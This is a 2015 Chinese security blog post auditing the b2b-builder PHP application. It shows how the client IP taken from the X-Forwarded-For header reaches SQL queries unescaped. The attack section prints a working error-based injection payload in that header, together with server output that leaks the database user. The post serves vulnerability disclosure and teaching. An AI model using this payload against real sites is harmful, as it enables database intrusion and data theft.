<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> b2b-builder 多处SQL注入漏洞 · xd_xd's blog</title><meta name="description" content="b2b-builder 多处SQL注入漏洞 - xd_xd"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="short icon" href="/favicon.ico"><link rel="stylesheet" href="/css/apollo.css"><script src="/js/jquery-3.1.0.min.js"></script><script src="/js/jquery.goup.js"></script><script src="/js/goup.js"></script><link rel="search" type="application/opensearchdescription+xml" href="http://xdxd.love/atom.xml" title="xd_xd's blog"></head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="/logo.jpg"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/about" target="_self" class="nav-list-link">ABOUT</a></li><li class="nav-list-item"><a href="https://github.com/stayliv3" target="_blank" class="nav-list-link">GITHUB</a></li><li class="nav-list-item"><a href="/archives" target="_self" class="nav-list-link">ARCHIVES</a></li><li class="nav-list-item"><a href="/friends" target="_self" class="nav-list-link">FRIENDS</a></li></ul></header><section class="container"><div class="post"><article class="post-block"><h1 class="post-title">b2b-builder 多处SQL注入漏洞</h1><div class="post-info">May 14, 2015</div><div class="post-content"><h1 id="代码分析">代码分析</h1><p>比较经典的xff sqli注入。b2bbuilder在有做addslash。但是获取ip的函数如下：</p>
<pre><code><span class="keyword">function</span> getip()
{
    if (isset($_SERVER)) {
    if (isset($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>])) {
       <span class="variable">$realip</span> = $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];
    } elseif (isset($_SERVER[<span class="string">'HTTP_CLIENT_IP'</span>])) {
       <span class="variable">$realip</span> = $_SERVER[<span class="string">'HTTP_CLIENT_IP'</span>];
    } else {
       <span class="variable">$realip</span> = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];
    }
    } else {
    if (getenv(<span class="string">"HTTP_X_FORWARDED_FOR"</span>)) {
       <span class="variable">$realip</span> = getenv( <span class="string">"HTTP_X_FORWARDED_FOR"</span>);
    } elseif (getenv(<span class="string">"HTTP_CLIENT_IP"</span>)) {
       <span class="variable">$realip</span> = getenv(<span class="string">"HTTP_CLIENT_IP"</span>);
    } else {
       <span class="variable">$realip</span> = getenv(<span class="string">"REMOTE_ADDR"</span>);
    }
    }
    return <span class="variable">$realip</span>;
}
</code></pre><p>很多地方都是用该函数获取ip，并且拼接到sql中执行。比如login.php,regiester.php等。其他地方也有，因为同一个原因，所以没有一一测试。以注册为例。</p>
<pre><code><span class="variable">$ip</span>=getip();<span class="variable">$ip</span>=<span class="keyword">empty</span>(<span class="variable">$ip</span>)?NULL:<span class="variable">$ip</span>;
    <span class="variable">$nt</span>=time();<span class="variable">$regtime</span>=date(<span class="string">"Y-m-d H:i:s"</span>);

    <span class="variable">$db</span>=new dba(<span class="variable">$config</span>[<span class="string">'dbhost'</span>],<span class="variable">$config</span>[<span class="string">'dbuser'</span>],<span class="variable">$config</span>[<span class="string">'dbpass'</span>],<span class="variable">$config</span>[<span class="string">'dbname'</span>],<span class="variable">$config</span>[<span class="string">'dbport'</span>]);    

    <span class="variable">$sql</span>=<span class="string">"select * from  "</span>.ALLUSER.<span class="string">" where user='$user' or email='$email'"</span>;
    <span class="variable">$db-</span>&gt;query(<span class="variable">$sql</span>);
    <span class="keyword">if</span>(<span class="variable">$db-</span>&gt;num_rows())
        die(<span class="string">"User name is have"</span>);
    //----------------
    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$config</span>[<span class="string">'user_reg'</span>])&amp;&amp;<span class="variable">$config</span>[<span class="string">'user_reg'</span>]!=<span class="number">3</span>)
        <span class="variable">$user</span>_reg=<span class="variable">$config</span>[<span class="string">'user_reg'</span>];
    elseif(<span class="variable">$config</span>[<span class="string">'user_reg'</span>]==<span class="number">3</span>)
        <span class="variable">$user</span>_reg=<span class="number">1</span>;
    <span class="keyword">else</span>
        <span class="variable">$user</span>_reg=<span class="number">2</span>;
    //----------------        
    <span class="variable">$sql</span>=<span class="string">"insert into "</span>.ALLUSER.<span class="string">"
     (user,password,ip,lastLoginTime,qq,msn,sex,mobile,position,email,country,regtime,statu,name)
     values
     ('$user','"</span>.md5(<span class="variable">$pass</span>).<span class="string">"','$ip','$nt','$_POST[qq]','$_POST[msn]','$_POST[sex]','$_POST[mobile]','$_POST[pos]','$email','$country','$regtime','$user_reg','$_POST[realname]')"</span>;
    <span class="variable">$re</span>=<span class="variable">$db-</span>&gt;query(<span class="variable">$sql</span>);
</code></pre><p>103行开始。获取ip最终进入了</p>
<pre><code><span class="title">insert</span> into <span class="string">".ALLUSER."</span>
 (user,password,ip,<span class="built_in">last</span>LoginTime,qq,msn,sex,mobile,position,email,country,regtime,statu,name)
 values
 (<span class="string">'<span class="variable">$user</span>'</span>,<span class="string">'".md5(<span class="variable">$pass</span>)."'</span>,<span class="string">'<span class="variable">$ip</span>'</span>,<span class="string">'<span class="variable">$nt</span>'</span>,<span class="string">'<span class="variable">$_POST</span>[qq]'</span>,<span class="string">'<span class="variable">$_POST</span>[msn]'</span>,<span class="string">'<span class="variable">$_POST</span>[sex]'</span>,<span class="string">'<span class="variable">$_POST</span>[mobile]'</span>,<span class="string">'<span class="variable">$_POST</span>[pos]'</span>,<span class="string">'<span class="variable">$email</span>'</span>,<span class="string">'<span class="variable">$country</span>'</span>,<span class="string">'<span class="variable">$regtime</span>'</span>,<span class="string">'<span class="variable">$user_reg</span>'</span>,<span class="string">'<span class="variable">$_POST</span>[realname]'</span>)
</code></pre><p>测试修改xff为X-Forwarded-For: 1.1.1.1’，服务器返回：</p>
<pre><code><span class="operator"><span class="keyword">insert</span> <span class="keyword">into</span> b2bbuilder_page_view
(<span class="keyword">url</span>,ip,<span class="keyword">time</span>,username,fileName)
<span class="keyword">values</span>
(<span class="string">'%2Fb2bbuilder%2Fregister.php'</span>,<span class="string">'1.1.1.1'','</span><span class="number">2015</span>-<span class="number">05</span>-<span class="number">14</span> <span class="number">17</span>:<span class="number">21</span>:<span class="number">11</span><span class="string">','</span><span class="keyword">test</span><span class="string">','</span>/b2bbuilder/<span class="keyword">register</span>.php<span class="string">')You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '</span><span class="number">2015</span>-<span class="number">05</span>-<span class="number">14</span> <span class="number">17</span>:<span class="number">21</span>:<span class="number">11</span><span class="string">','</span><span class="keyword">test</span><span class="string">','</span>/b2bbuilder/<span class="keyword">register</span>.php<span class="string">')'</span> <span class="keyword">at</span> line <span class="number">4</span></span>
</code></pre><h1 id="漏洞利用">漏洞利用</h1><p>poc:X-Forwarded-For: 1.1.1.1’ or updatexml(1,concat(0x5c,user()),1) or ‘</p>
<pre><code><span class="operator"><span class="keyword">insert</span> <span class="keyword">into</span> b2bbuilder_page_view
    (<span class="keyword">url</span>,ip,<span class="keyword">time</span>,username,fileName)
    <span class="keyword">values</span>
    (<span class="string">'%2Fb2bbuilder%2Fregister.php'</span>,<span class="string">'1.1.1.1'</span> <span class="keyword">or</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x5c</span>,<span class="keyword">user</span>()),<span class="number">1</span>) <span class="keyword">or</span> <span class="string">''</span>,<span class="string">'2015-05-14 19:27:43'</span>,<span class="string">'test'</span>,<span class="string">'/b2bbuilder/register.php'</span>)XPATH syntax <span class="keyword">error</span>: <span class="string">'\root@localhost'</span></span>
</code></pre></div></article></div></section><footer><div class="paginator"><a href="/2015/05/14/代码审计之SQL注入/" class="prev">上一篇</a><a href="/2015/05/14/代码审计之文件包含/" class="next">下一篇</a></div><div class="copyright"><p>© 2016 <a href="http://xdxd.love">xd_xd</a>, powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/hkalexling/Yuno-Apollo" target="_blank">Yuno-Apollo</a>.</p></div></footer></div><script src="https://cdn.bootcss.com/mathjax/2.6.1/MathJax.js?config=TeX-MML-AM_CHTML"></script></body></html>